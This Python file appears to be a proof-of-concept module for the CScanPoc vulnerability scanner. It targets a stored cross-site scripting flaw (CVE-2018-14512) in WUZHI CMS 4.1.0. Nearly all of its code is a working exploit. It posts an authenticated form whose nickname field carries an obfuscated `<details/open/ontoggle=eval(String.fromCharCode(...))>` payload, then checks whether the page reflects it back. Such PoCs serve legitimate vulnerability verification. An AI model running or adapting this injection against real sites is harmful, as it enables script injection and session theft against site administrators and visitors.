# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'WuZhiCMS_0005_L'  # 平台漏洞编号
    name = 'WUZHI CMS跨站脚本'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2018-07-26'  # 漏洞公布时间
    desc = '''
    WUZHI CMS是中国五指（WUZHI）互联科技公司的一套基于PHP和MySQL的开源内容管理系统（CMS）
    WUZHI CMS 4.1.0版本中存在跨站脚本漏洞。远程攻击者可通过向index.php?m=core&f=set&v=sendmail URL发送‘form[nickname]’参数利用该漏洞注入任意的Web脚本或HTML。  
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2018-14090'
    cnvd_id = 'CNVD-2018-14090'  # cnvd漏洞编号
    cve_id = 'CVE-2018-14512'  # cve编号
    product = 'WuZhiCMS'  # 漏洞组件名称
    product_version = '4.1.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '2d5cc26c-bea4-4cd6-a8ef-c5f106569270'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-07-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                },
                'cookie': {
                    'type': 'string',
                    'description': '登录cookie',
                    'default': '',
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            self.output.info('正在构造XSS测试语句')
            url_payload = "/index.php?m=core&f=set&v=sendmail&_su=wuzhicms&_menuid=24"
            vul_url = arg + url_payload
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': self.get_option('cookie')
            }
            xss_data = "form%5Bmail_type%5D=1&form%5Bsmtp_server%5D=smtp.qq.com&form%5Bsmtp_port%5D=465&form%5Bauth%5D=1&form%5Bopenssl%5D=1&form%5Bsmtp_user%5D=188434853%40qq.com&password=**************************&form%5Bsend_email%5D=188434853%40qq.com&form%5Bnickname%5D=%E4%BA%94%E6%8C%87cms%E6%BC%94%E7%A4%BA%22%3E%3Cdetails%2Fopen%2Fontoggle%3Deval%28String.fromCharCode%2897%29%2BString.fromCharCode%28108%29%2BString.fromCharCode%28101%29%2BString.fromCharCode%28114%29%2BString.fromCharCode%28116%29%2BString.fromCharCode%2840%29%2BString.fromCharCode%2850%29%2BString.fromCharCode%2841%29%29%3E&form%5Bsign%5D=%3Chr+%2F%3E%0D%0A%E9%82%AE%E4%BB%B6%E7%AD%BE%E5%90%8D%EF%BC%9A%E6%AC%A2%E8%BF%8E%E8%AE%BF%E9%97%AE+%3Ca+href%3D%22http%3A%2F%2Fwww.wuzhicms.com%22+target%3D%22_blank%22%3E%E4%BA%94%E6%8C%87cms%3C%2Fa%3E%0D%0A%3Cimg%2Fsrc%3D1%3E&submit=%E6%8F%90%E4%BA%A4"
            response = requests.post(vul_url, headers=headers, data=xss_data)

            response2 = requests.get(vul_url, headers=headers)
            if response2.status_code == 200 and '<details/open/ontoggle=eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+String.fromCharCode(40)+String.fromCharCode(50)+String.fromCharCode(41))>' in response2.text and '/wuzhicms/res/css/ie7/ie7.css' in response2.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
